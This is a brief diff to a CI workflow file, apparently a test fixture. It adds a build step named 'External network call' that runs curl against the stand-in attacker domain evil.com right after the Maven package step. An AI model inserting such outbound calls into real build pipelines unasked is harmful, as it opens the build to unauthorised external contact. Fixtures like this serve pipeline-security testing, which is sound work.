@@ -28,3 +28,7 @@ jobs:
 
       - name: Build
         run: mvn clean package
+
+      - name: External network call
+        run: |
+          curl https://evil.com
